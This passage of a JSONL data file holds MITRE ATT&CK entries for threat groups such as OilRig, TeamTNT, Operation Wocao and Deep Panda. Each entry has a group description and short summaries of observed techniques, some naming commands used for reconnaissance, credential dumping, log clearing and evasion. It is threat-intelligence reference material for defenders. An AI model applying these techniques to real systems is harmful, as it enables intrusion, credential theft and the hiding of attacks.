"OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access.", "OilRig has run <code>whoami</code> on a victim.", "OilRig has used <code>reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default”</code> on a victim to query the Registry.", "OilRig has used brute force techniques to obtain credentials.", "OilRig has a tool called CANDYKING to capture a screenshot of user's desktop.", "OilRig has used net.exe in a script with <code>net accounts /domain</code> to find the password policy of a domain.", "OilRig has run <code>hostname</code> and <code>systeminfo</code> on a victim.\t", "A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.", "OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.", "OilRig has used tools to identify if a mouse is connected to a targeted system.", "OilRig has used macros to verify if a mouse is connected to a compromised machine.", "OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim.", "OilRig has used LinkedIn to send spearphishing links.", "OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.", "OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment.", "OilRig has used <code>sc query</code> on a victim to gather information about services.", "OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.", "OilRig can download remote files onto victims."], "is_subtechnique": false}
{"text": " [Strider](https://attack.mitre.org/groups/G0041) is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.(Citation: Symantec Strider Blog)(Citation: Kaspersky ProjectSauron Blog)", "idx": "https://attack.mitre.org/groups/G0041", "title": "Strider", "entity": "Strider", "entity_type": "groups", "entity_context": ["Strider has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.", "Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.", "Strider has used a hidden file system that is stored as a file on disk."], "is_subtechnique": false}
{"text": " [Poseidon Group](https://attack.mitre.org/groups/G0033) is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the [Poseidon Group](https://attack.mitre.org/groups/G0033) as a security firm. (Citation: Kaspersky Poseidon Group)", "idx": "https://attack.mitre.org/groups/G0033", "title": "Poseidon Group", "entity": "Poseidon Group", "entity_type": "groups", "entity_context": ["After compromising a victim, Poseidon Group lists all running processes.", "Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.", "Poseidon Group obtains and saves information about victim network interfaces and addresses.", "Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense.", "After compromising a victim, Poseidon Group discovers all running services.", "The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components.", "Poseidon Group searches for administrator accounts on both the local victim machine and the network."], "is_subtechnique": false}
{"text": " [Night Dragon](https://attack.mitre.org/groups/G0014) is a campaign name for activity involving a threat group that has conducted activity originating primarily in China. (Citation: McAfee Night Dragon)", "idx": "https://attack.mitre.org/groups/G0014", "title": "Night Dragon", "entity": "Night Dragon", "entity_type": "groups", "entity_context": ["Night Dragon has obtained and used tools such as gsecdump.", "Night Dragon is known to use software packing in its tools.", "Night Dragon has used ports 25 and 80 for C2 communications.", "Night Dragon has used compromised VPN accounts to gain access to victim systems.", "A Night Dragon DLL included an XOR-encoded section.", "Night Dragon used privately developed and customized remote access tools.", "Night Dragon used pass-the-hash tools to gain usernames and passwords.", "Night Dragon has used HTTP for C2.", "Night Dragon has dumped account hashes with Carbanak and cracked them with Cain & Abel.", "Night Dragon enticed users to click on links in spearphishing emails to download malware.", "Night Dragon has copied files to company web servers and subsequently downloaded them.", "Night Dragon has performed SQL injection attacks of extranet web servers to gain access.", "Night Dragon has used several remote administration tools as persistent infiltration channels.", "Night Dragon sent spearphishing emails containing links to compromised websites where malware was downloaded.", "Night Dragon has disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors have also disabled proxy settings to allow direct communication from victims to the Internet."], "is_subtechnique": false}
{"text": " [TeamTNT](https://attack.mitre.org/groups/G0139) is a threat group that has primarily targeted cloud and containerized environments. The group as been active since at least October 2019 and has mainly focused its efforts on leveraging cloud and container resources to deploy cryptocurrency miners in victim environments. (Citation: Palo Alto Black-T October 2020)(Citation: Lacework TeamTNT May 2021)(Citation: Intezer TeamTNT September 2020)(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro TeamTNT)(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Aqua TeamTNT August 2020)(Citation: Intezer TeamTNT Explosion September 2021)", "idx": "https://attack.mitre.org/groups/G0139", "title": "TeamTNT", "entity": "TeamTNT", "entity_type": "groups", "entity_context": ["TeamTNT has disabled and uninstalled security tools.", "TeamTNT has the curl command to send credentials over HTTP and download new software. TeamTNT has also used a custom user agent HTTP header in shell scripts.", "TeamTNT has cleared command history with <code>history -c</code>.", "TeamTNT has used the open-source rootkit Diamorphine to hide cryptocurrency mining activities on the machine. ", "TeamTNT has the curl command and batch scripts to download new tools.", "TeamTNT has used SSH to connect back to victim machines.", "TeamTNT has searched for unsecured AWS credentials and Docker API credentials.", "TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.", "TeamTNT has used an IRC bot for C2 communications.", "TeamTNT has queried the AWS instance metadata service for credentials.", "TeamTNT has used shell scripts for execution.", "TeamTNT has added RSA keys in <code>authorized_keys</code>.", "TeamTNT has checked for running containers with <code>docker ps</code> and for specific container names with <code>docker inspect</code>.", "TeamTNT has added batch scripts to the startup folder.", "TeamTNT uses malware that adds cryptocurrency miners as a service.", "TeamTNT has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.", "TeamTNT has uploaded backdoored Docker images to Docker Hub.", "TeamTNT has encrypted its binaries via AES. TeamTNT has also encoded files using Base64.", "TeamTNT runs <code>netstat -anp</code> to search for rival malware connections. TeamTNT has also used libprocesshider to modify <code>/etc/ld.so.preload</code>.", "TeamTNT has searched for unsecured SSH keys.", "TeamTNT has disabled <code>iptables</code>.", "TeamTNT has leveraged iplogger.org to send collected data back to C2. ", "TeamTNT has established persistence through the creation of a cryptocurrency mining system service.", "TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments. TeamTNT has also targeted exposed kubelets for Kubernetes environments.", "TeamTNT looks for the host machine’s IP address.", "TeamTNT has created local privileged users on victim machines.", "TeamTNT searches for rival malware and removes them if found.", "TeamTNT has searched for security products on infected machines.", "TeamTNT has developed custom malware such as Hildegard.", "TeamTNT has used masscan to search for open Docker API ports. TeamTNT has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.", "TeamTNT relies on users to download and execute malicious Docker images.", "TeamTNT has deployed different types of containers into victim environments to facilitate execution.", "TeamTNT has modified the permissions on binaries with <code>chattr</code>.", "TeamTNT has used UPX and Ezuri packer to pack its binaries.", "TeamTNT has obtained domains to host their payloads.", "TeamTNT has executed PowerShell commands in batch scripts.", "TeamTNT has established tmate sessions for C2 communications.", "TeamTNT has removed system logs from <code>/var/log/syslog</code>.", "TeamTNT has deployed privileged containers that mount the filesystem of victim machine.", "TeamTNT has searched for system version and architecture information.", "TeamTNT has used batch scripts to download tools and executing cryptocurrency miners.", "TeamTNT has deployed XMRig Docker images to mine cryptocurrency. ", "TeamTNT has scanned specific lists of target IP addresses.", "TeamTNT uses a payload that removes itself after running."], "is_subtechnique": false}
{"text": " [NEODYMIUM](https://attack.mitre.org/groups/G0055) is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called [PROMETHIUM](https://attack.mitre.org/groups/G0056) due to overlapping victim and campaign characteristics. (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21) [NEODYMIUM](https://attack.mitre.org/groups/G0055) is reportedly associated closely with [BlackOasis](https://attack.mitre.org/groups/G0063) operations, but evidence that the group names are aliases has not been identified. (Citation: CyberScoop BlackOasis Oct 2017)", "idx": "https://attack.mitre.org/groups/G0055", "title": "NEODYMIUM", "entity": "NEODYMIUM", "entity_type": "groups", "entity_context": [], "is_subtechnique": false}
{"text": " [Tonto Team](https://attack.mitre.org/groups/G0131) is a suspected Chinese state-sponsored cyber espionage threat group that has primarily targeted South Korea, Japan, Taiwan, and the United States since at least 2009; by 2020 they expanded operations to include other Asian as well as Eastern European countries. [Tonto Team](https://attack.mitre.org/groups/G0131) has targeted government, military, energy, mining, financial, education, healthcare, and technology organizations, including through the Heartbeat Campaign (2009-2012) and Operation Bitter Biscuit (2017).(Citation: Kaspersky CactusPete Aug 2020)(Citation: ESET Exchange Mar 2021)(Citation: FireEye Chinese Espionage October 2019)(Citation: ARS Technica China Hack SK April 2017)(Citation: Trend Micro HeartBeat Campaign January 2013)(Citation: Talos Bisonal 10 Years March 2020)", "idx": "https://attack.mitre.org/groups/G0131", "title": "Tonto Team", "entity": "Tonto Team", "entity_type": "groups", "entity_context": ["Tonto Team has relied on user interaction to open their spearphishing attachments.", "Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader.", "Tonto Team has used PowerShell to download additional payloads.", "Tonto Team has used Python-based tools for execution. ", "Tonto Team has used keylogging tools in their operations.", "Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL.", "Tonto Team has used tools such as NBTscan to enumerate network shares.", "Tonto Team has exploited Microsoft vulnerabilities, including CVE-2018-8174, CVE-2018-0802, and CVE-2017-11882, as well as other vulnerabilities such as CVE-2019-9489 and CVE-2020-8468, to enable execution of their delivered malicious payloads.", "Tonto Team has exploited CVE-2019-0803 and MS16-032 to escalate privileges.", "Tonto Team has used the <code>ShowLocalGroupDetails</code> command to identify administrator, user, and guest accounts on a compromised host.", "Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server.", "Tonto Team has used a variety of credential dumping tools. ", "Tonto Team has used EternalBlue exploits for lateral movement.", "Tonto Team has delivered payloads via spearphishing attachments.", "Tonto Team has routed their traffic through an external server in order to obfuscate their location."], "is_subtechnique": false}
{"text": " [PROMETHIUM](https://attack.mitre.org/groups/G0056) is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. [PROMETHIUM](https://attack.mitre.org/groups/G0056) has demonstrated similarity to another activity group called [NEODYMIUM](https://attack.mitre.org/groups/G0055) due to overlapping victim and campaign characteristics.(Citation: Microsoft NEODYMIUM Dec 2016)(Citation: Microsoft SIR Vol 21)(Citation: Talos Promethium June 2020)", "idx": "https://attack.mitre.org/groups/G0056", "title": "PROMETHIUM", "entity": "PROMETHIUM", "entity_type": "groups", "entity_context": ["PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers.", "PROMETHIUM has created self-signed certificates to sign malicious installers.", "PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.", "PROMETHIUM has used Registry run keys to establish persistence.", "PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers.", "PROMETHIUM has signed code with self-signed certificates.", "PROMETHIUM has created new services and modified existing services for persistence.", "PROMETHIUM has named services to appear legitimate.", "PROMETHIUM has created admin accounts on a compromised host.", "PROMETHIUM has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.", "PROMETHIUM has created self-signed digital certificates for use in HTTPS C2 traffic."], "is_subtechnique": false}
{"text": " [Cleaver](https://attack.mitre.org/groups/G0003) is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver. (Citation: Cylance Cleaver) Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889). (Citation: Dell Threat Group 2889)", "idx": "https://attack.mitre.org/groups/G0003", "title": "Cleaver", "entity": "Cleaver", "entity_type": "groups", "entity_context": ["Cleaver has used custom tools to facilitate ARP cache poisoning.", "Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor.", "Cleaver has created fake LinkedIn profiles that included profile photos, details, and connections.", "Cleaver has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz.", "Cleaver has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging."], "is_subtechnique": false}
{"text": " [APT18](https://attack.mitre.org/groups/G0026) is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical. (Citation: Dell Lateral Movement)", "idx": "https://attack.mitre.org/groups/G0026", "title": "APT18", "entity": "APT18", "entity_type": "groups", "entity_context": ["APT18 actors leverage legitimate credentials to log into external remote services.", "APT18 can list files information for specific directories.", "APT18 establishes persistence via the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key.", "APT18 obfuscates strings in the payload.", "APT18 actors deleted tools and batch files from victim systems.", "APT18 uses port 80 for C2 communications.", "APT18 uses HTTP for C2 communications.", "APT18 can upload a file to the victim’s machine.", "APT18 uses cmd.exe to execute commands on the victim’s machine.", "APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.", "APT18 uses DNS for C2 communications.", "APT18 can collect system information from the victim’s machine."], "is_subtechnique": false}
{"text": " [Equation](https://attack.mitre.org/groups/G0020) is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives. (Citation: Kaspersky Equation QA)", "idx": "https://attack.mitre.org/groups/G0020", "title": "Equation", "entity": "Equation", "entity_type": "groups", "entity_context": ["Equation has been observed utilizing environmental keying in payload delivery.", "Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers. ", "Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.", "Equation has used an encrypted virtual file system stored in the Windows Registry."], "is_subtechnique": false}
{"text": " [Ajax Security Team](https://attack.mitre.org/groups/G0130) is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 [Ajax Security Team](https://attack.mitre.org/groups/G0130) transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies.(Citation: FireEye Operation Saffron Rose 2013)", "idx": "https://attack.mitre.org/groups/G0130", "title": "Ajax Security Team", "entity": "Ajax Security Team", "entity_type": "groups", "entity_context": ["Ajax Security Team has used various social media channels to spearphish victims.", "Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.", "Ajax Security Team has lured victims into executing malicious files.", "Ajax Security Team has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage.", "Ajax Security Team has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system.", "Ajax Security Team has used personalized spearphishing attachments."], "is_subtechnique": false}
{"text": " [FIN5](https://attack.mitre.org/groups/G0053) is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian. (Citation: FireEye Respond Webinar July 2017) (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)", "idx": "https://attack.mitre.org/groups/G0053", "title": "FIN5", "entity": "FIN5", "entity_type": "groups", "entity_context": ["FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.", "FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.", "FIN5 uses SDelete to clean up the environment and attempt to prevent detection.", "FIN5 has cleared event logs from victims.", "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.", "FIN5 scripts save memory dump data into a specific directory on hosts in the victim environment.", "FIN5 maintains access to victim environments by using FLIPSIDE to create a proxy for a backup RDP tunnel.", "FIN5 has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.", "FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor.", "FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets."], "is_subtechnique": false}
{"text": " [TA459](https://attack.mitre.org/groups/G0062) is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. (Citation: Proofpoint TA459 April 2017)", "idx": "https://attack.mitre.org/groups/G0062", "title": "TA459", "entity": "TA459", "entity_type": "groups", "entity_context": ["TA459 has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.", "TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.", "TA459 has used PowerShell for execution of a payload.", "TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments.", "TA459 has a VBScript for execution."], "is_subtechnique": false}
{"text": " [Axiom](https://attack.mitre.org/groups/G0001) is a cyber espionage group suspected to be associated with the Chinese government. It is responsible for the Operation SMN campaign. (Citation: Novetta-Axiom) Though both this group and [Winnti Group](https://attack.mitre.org/groups/G0044) use the malware [Winnti for Windows](https://attack.mitre.org/software/S0141), the two groups appear to be distinct based on differences in reporting on the groups' TTPs and targeting. (Citation: Kaspersky Winnti April 2013) (Citation: Kaspersky Winnti June 2015) (Citation: Novetta Winnti April 2015)", "idx": "https://attack.mitre.org/groups/G0001", "title": "Axiom", "entity": "Axiom", "entity_type": "groups", "entity_context": ["Axiom has been observed using SQL injection to gain access to systems.", "Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.", "The Axiom group is known to have used RDP during operations.", "Some malware that has been used by Axiom also uses steganography to hide communication in PNG image files.", "Axiom has been known to dump credentials.", "The Axiom group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate."], "is_subtechnique": false}
{"text": " [The White Company](https://attack.mitre.org/groups/G0089) is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan.(Citation: Cylance Shaheen Nov 2018)", "idx": "https://attack.mitre.org/groups/G0089", "title": "The White Company", "entity": "The White Company", "entity_type": "groups", "entity_context": ["The White Company has sent phishing emails with malicious Microsoft Word attachments to victims.", "The White Company has checked for specific antivirus products on the target’s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.", "The White Company has checked the current date on the victim system.", "The White Company has used phishing lure documents that trick users into opening them and infecting their computers.", "The White Company has the ability to delete its malware entirely from the target system.", "The White Company has obfuscated their payloads through packing.", " The White Company has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code."], "is_subtechnique": false}
{"text": " [APT-C-36](https://attack.mitre.org/groups/G0099) is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing.(Citation: QiAnXin APT-C-36 Feb2019)", "idx": "https://attack.mitre.org/groups/G0099", "title": "APT-C-36", "entity": "APT-C-36", "entity_type": "groups", "entity_context": ["APT-C-36 has used port 4050 for C2 communications.", "APT-C-36 has prompted victims to accept macros in order to execute the subsequent payload.", "APT-C-36 has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway. ", "APT-C-36 has disguised its scheduled tasks as those used by Google.", "APT-C-36 obtained and used a modified variant of Imminent Monitor.", "APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened.", "APT-C-36 has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.", "APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google.", "APT-C-36 has embedded a VBScript within a malicious Word document which is executed upon the document opening."], "is_subtechnique": false}
{"text": " [APT16](https://attack.mitre.org/groups/G0023) is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations. (Citation: FireEye EPS Awakens Part 2)", "idx": "https://attack.mitre.org/groups/G0023", "title": "APT16", "entity": "APT16", "entity_type": "groups", "entity_context": ["APT16 has compromised otherwise legitimate sites as staging servers for second-stage payloads."], "is_subtechnique": false}
{"text": " [Deep Panda](https://attack.mitre.org/groups/G0009) is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications. (Citation: Alperovitch 2014) The intrusion into healthcare company Anthem has been attributed to [Deep Panda](https://attack.mitre.org/groups/G0009). (Citation: ThreatConnect Anthem) This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther. (Citation: RSA Shell Crew) [Deep Panda](https://attack.mitre.org/groups/G0009) also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion. (Citation: Symantec Black Vine) Some analysts track [Deep Panda](https://attack.mitre.org/groups/G0009) and [APT19](https://attack.mitre.org/groups/G0073) as the same group, but it is unclear from open source information if the groups are the same. (Citation: ICIT China's Espionage Jul 2016)", "idx": "https://attack.mitre.org/groups/G0009", "title": "Deep Panda", "entity": "Deep Panda", "entity_type": "groups", "entity_context": ["Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.", "Deep Panda has used ping to identify other machines of interest.", "The Deep Panda group is known to utilize WMI for lateral movement.", "Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.", "Deep Panda has updated and modified its malware, resulting in different hash values that evade detection.", "Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.", "Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.", "Deep Panda uses net.exe to connect to network shares using <code>net use</code> commands with compromised credentials.", "Deep Panda has used <code>-w hidden</code> to conceal PowerShell windows by setting the WindowStyle parameter to hidden. ", "Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk."], "is_subtechnique": false}
{"text": " [GCMAN](https://attack.mitre.org/groups/G0036) is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services. (Citation: Securelist GCMAN)", "idx": "https://attack.mitre.org/groups/G0036", "title": "GCMAN", "entity": "GCMAN", "entity_type": "groups", "entity_context": ["GCMAN uses Putty for lateral movement.", "GCMAN uses VNC for lateral movement."], "is_subtechnique": false}
{"text": " [Dark Caracal](https://attack.mitre.org/groups/G0070) is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012. (Citation: Lookout Dark Caracal Jan 2018)", "idx": "https://attack.mitre.org/groups/G0070", "title": "Dark Caracal", "entity": "Dark Caracal", "entity_type": "groups", "entity_context": ["Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems.", "Dark Caracal collected file listings of all default Windows directories.", "Dark Caracal took screenshots using their Windows malware.", "Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable.", "Dark Caracal has used macros in Word documents that would download a second stage if executed.", "Dark Caracal makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.", "Dark Caracal's version of Bandook adds a registry key to <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them.", "Dark Caracal has used UPX to pack Bandook.", "Dark Caracal spearphished victims via Facebook and Whatsapp.", "Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”.", "Dark Caracal leveraged a watering hole to serve up malicious code."], "is_subtechnique": false}
{"text": " [Operation Wocao](https://attack.mitre.org/groups/G0116) described activities carried out by a China-based cyber espionage adversary. [Operation Wocao](https://attack.mitre.org/groups/G0116) targeted entities within the government, managed service providers, energy, health care, and technology sectors across several countries, including China, France, Germany, the United Kingdom, and the United States. [Operation Wocao](https://attack.mitre.org/groups/G0116) used similar TTPs and tools to APT20, suggesting a possible overlap.(Citation: FoxIT Wocao December 2019)", "idx": "https://attack.mitre.org/groups/G0116", "title": "Operation Wocao", "entity": "Operation Wocao", "entity_type": "groups", "entity_context": ["Operation Wocao can proxy traffic through multiple infected systems.", "Operation Wocao has used ProcDump to dump credentials from memory.", "Operation Wocao has deleted logs and executable files used during an intrusion.", "Operation Wocao can download additional files to the infected system.", "Operation Wocao has scanned for open ports and used nbtscan to find NETBIOS nameservers.", "Operation Wocao has collected a list of open connections on the infected system using netstat and checks whether it has an internet connection.", "Operation Wocao has collected clipboard data in plaintext.", "Operation Wocao has used PowerShell to add and delete rules in the Windows firewall.", "Operation Wocao has obtained the password for the victim's password manager via a custom keylogger.", "Operation Wocao has used scripts to detect security software.", "Operation Wocao has queried the registry to detect recent PuTTY sessions.", "Operation Wocao has used stolen credentials to connect to the victim's network via VPN.", "Operation Wocao has used PowerSploit's Invoke-Kerberoast module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.", "Operation Wocao has archived collected files with WinRAR, prior to exfiltration.", "Operation Wocao has discovered removable disks attached to a system.", "Operation Wocao has used the <code>net</code> command to retrieve information about domain accounts.\t ", "Operation Wocao has gained initial access via vulnerable webservers.", "Operation Wocao has gathered a recursive directory listing to find files and directories of interest.", "Operation Wocao has used the command <code>net localgroup administrators</code> to list all administrators part of a local group.", "Operation Wocao has used the <code>time</code> command to retrieve the current time of a compromised system.", "Operation Wocao has discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.", "Operation Wocao has staged archived files in a temporary directory prior to exfiltration.\t", "Operation Wocao has used the <code>tasklist</code> command to search for one of its backdoors.", "Operation Wocao has used WMI to execute commands.", "Operation Wocao has executed commands through the installed web shell via Tor exit nodes.", "Operation Wocao has used PowerShell on compromised systems.", "Operation Wocao has accessed and collected credentials from password managers.", "Operation Wocao has executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.", "Operation Wocao has used a script to collect information about the infected system.", "Operation Wocao has injected code into a selected process, which in turn launches a command as a child process of the original.", "Operation Wocao has used Mimikatz's DCSync to dump credentials from the memory of the targeted system.\t", "Operation Wocao has encrypted IP addresses used for \"Agent\" proxy hops with RC4.", "Operation Wocao has used a custom proxy tool called \"Agent\" which has support for multiple hops.", "Operation Wocao has discovered network disks mounted to the system using netstat.", "Operation Wocao can use the <code>ping</code> command to discover remote systems.", "Operation Wocao has used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.", "Operation Wocao has used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.", "Operation Wocao has exfiltrated files and directories of interest from the targeted system.", "Operation Wocao has used SMB to copy files to and from target systems.", "Operation Wocao has enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.", "Operation Wocao has created services on remote systems for execution purposes.", "Operation Wocao has used the CreateProcessA and ShellExecute API function to launch commands after being injected into a selected process.", "Operation Wocao's backdoors have been written in Python and compiled with py2exe.", "Operation Wocao has spawned a new <code>cmd.exe</code> process to execute commands.\t ", "Operation Wocao has used the Xserver backdoor to exfiltrate data.", "Operation Wocao has used valid VPN credentials to gain initial access.", "Operation Wocao has discovered the local network configuration with ipconfig.", "Operation Wocao has enabled Wdigest by changing the registry value from 0 to 1.", "Operation Wocao has edited variable names within the Impacket suite to avoid automated detection.", "Operation Wocao has used a VBScript to conduct reconnaissance on targeted systems.", "Operation Wocao's proxy implementation \"Agent\" can upgrade the socket in use to a TLS socket.", "Operation Wocao has deleted Windows Event Logs to hinder forensic investigation.", "Operation Wocao has used local account credentials found during the intrusion for lateral movement and privilege escalation.", "Operation Wocao has used domain credentials, including domain admin, for lateral movement and privilege escalation.", "Operation Wocao has collected a list of running processes on the infected system.", "Operation Wocao has used scheduled tasks to execute malicious PowerShell code on remote systems.", "Operation Wocao has used a custom collection method to intercept two-factor authentication soft tokens.", "Operation Wocao has used a custom protocol for command and control.", "Operation Wocao has collected a list of installed software on the infected system.", "Operation Wocao has used Mimikatz to dump certificates and private keys from the Windows certificate store."], "is_subtechnique": false}
{"text": " [Thrip](https://attack.mitre.org/groups/G0076) is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as \"living off the land\" techniques. (Citation: Symantec Thrip June 2018)", "idx": "https://attack.mitre.org/groups/G0076", "title": "Thrip", "entity": "Thrip", "entity_type": "groups", "entity_context": ["Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.", "Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP.", "Thrip used a cloud-based remote access software called LogMeIn for their attacks.", "Thrip has obtained and used tools such as Mimikatz and PsExec."], "is_subtechnique": false}
{"text": " [PittyTiger](https://attack.mitre.org/groups/G0011) is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.(Citation: Bizeul 2014)(Citation: Villeneuve 2014)", "idx": "https://attack.mitre.org/groups/G0011", "title": "PittyTiger", "entity": "PittyTiger", "entity_type": "groups", "entity_context": ["PittyTiger attempts to obtain legitimate credentials during operations.", "PittyTiger has obtained and used tools such as Mimikatz and gsecdump."], "is_subtechnique": false}
{"text": " [Ferocious Kitten](https://attack.mitre.org/groups/G0137) is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)", "idx": "https://attack.mitre.org/groups/G0137", "title": "Ferocious Kitten", "entity": "Ferocious Kitten", "entity_type": "groups", "entity_context": ["Ferocious Kitten has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.", "Ferocious Kitten has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.", "Ferocious Kitten has used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones.", "Ferocious Kitten has obtained open source tools for its operations, including JsonCPP and Psiphon.", "Ferocious Kitten has acquired domains imitating legitimate sites.", "Ferocious Kitten has named malicious files <code>update.exe</code> and loaded them into the compromise host's “Public” folder."], "is_subtechnique": false}
